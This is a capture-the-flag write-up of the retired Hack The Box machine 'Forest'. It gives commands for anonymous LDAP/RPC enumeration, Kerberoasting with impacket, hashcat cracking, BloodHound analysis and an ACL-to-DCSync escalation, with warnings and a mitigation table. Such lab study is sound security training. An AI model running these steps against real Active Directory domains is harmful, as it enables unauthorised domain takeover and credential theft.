> [!NOTE]
> **Machine notes.** Credentials, hashes and flags are redacted; output is
> illustrative. Forest is retired; complete it on Hack The Box for the real values.

## Executive summary

Forest is a medium Windows domain controller. The path starts with anonymous LDAP
enumeration, moves through a service account and Kerberoasting, and ends with
domain privileges obtained through ACL abuse.

The lesson is that Active Directory permissions are transitive: a helpful-looking
group membership can grant control over the domain.

## Machine information

| Field | Value |
| --- | --- |
| Platform | Hack The Box |
| Machine | Forest |
| Difficulty | Medium (retired) |
| Operating system | Windows |
| Category | Active Directory |
| Skills | LDAP enumeration, Kerberoasting, ACL abuse, DCSync |

## Objectives

- Enumerate users and groups without credentials.
- Identify account properties that permit offline password attacks.
- Interpret ACLs and find a path to domain privileges.
- Demonstrate domain-level access without persistence.

## Tools used

| Tool | Purpose |
| --- | --- |
| `nmap`, `rpcclient`, `ldapsearch` | Enumeration |
| `impacket-GetUserSPNs` | Kerberoasting |
| `hashcat` | Offline cracking |
| BloodHound | ACL path analysis |

## Initial reconnaissance

```bash
nmap -Pn -sV -sC -p- <machine-ip> -oN nmap-forest.txt
```

Expect DNS (53), Kerberos (88), LDAP (389/636), SMB (445) and WinRM (5985). A
domain controller has a distinctive fingerprint; the hostname and domain appear in
the SMB and LDAP scripts.

```bash
nmap -Pn -p 88,389,445 --script "ldap-rootdse,smb-os-discovery" <machine-ip>
```

## Enumeration

Anonymous LDAP often permits user and group listing:

```bash
ldapsearch -x -H ldap://<dc-ip> -b "dc=<domain>,dc=local" \
  "(objectClass=user)" sAMAccountName servicePrincipalName
```

```bash
rpcclient -U '' -N <dc-ip>
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
```

Record:

- Accounts with a `servicePrincipalName` (kerberoastable).
- Group memberships, especially nested ones.
- Accounts with no pre-authentication required (AS-REP roastable).

## Vulnerability identification

Three findings develop in sequence:

1. **Anonymous LDAP and RPC enumeration** exposes the domain structure.
2. **Service accounts with SPNs and weak passwords** are kerberoastable offline.
3. **ACLs granting a low-privilege account rights over a privileged group** enable
   privilege escalation.

Each is a configuration issue. The third is the one that turns a cracked password
into domain admin.

## Exploitation

Request service tickets:

```bash
impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <dc-ip> -request -outputfile hashes.txt
```

Crack offline:

```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

The cracked credential belongs to a service account. Enumerate what that account
can do before assuming escalation:

```bash
bloodhound-python -u <user> -p <password> -d <domain> -ns <dc-ip> -c All
```

## Privilege escalation

In BloodHound, inspect outbound control from the compromised account. Rights such
as `GenericAll`, `WriteDACL` or `GenericWrite` over a group allow adding a
controlled account to that group.

The typical sequence:

1. Identify a group with DCSync rights (`Replicating Directory Changes`).
2. Add the controlled account to it using the ACL you hold.
3. Request replication to obtain credential material.
4. Demonstrate domain access with a read-only action.

Each step changes directory state. Do it deliberately, record what changed, and
revert the membership at the end. Never leave an added account behind.

> [!WARNING]
> DCSync returns password hashes for every account. Retrieve the minimum proof
> required, do not crack more accounts than necessary, and never reuse credentials
> outside the lab.

## Flags and completion evidence

Flags are redacted. Record the ACL edge used, the group modified, and the read-only
action that proves domain access.

## Lessons learned

- Anonymous LDAP is a map of the domain.
- Kerberoasting is an offline attack; detection must focus on ticket requests.
- ACLs are permissions, and permissions are transitive.
- Directory changes during a test must be documented and reverted.
- BloodHound answers "what next" better than manual enumeration on large domains.

## Mitigation and remediation

| Issue | Control |
| --- | --- |
| Anonymous LDAP/RPC | Restrict anonymous enumeration |
| Weak service account passwords | gMSA or long random secrets |
| Broad ACLs | Access reviews; remove unnecessary control rights |
| DCSync rights | Limit to tier-0 accounts; monitor replication |
| Kerberoasting exposure | Monitor for anomalous TGS requests |

## References

- Hack The Box — Forest.
- Microsoft — Active Directory permissions and replication.
- MITRE ATT&CK — Steal or Forge Kerberos Tickets (T1558).
- BloodHound documentation.
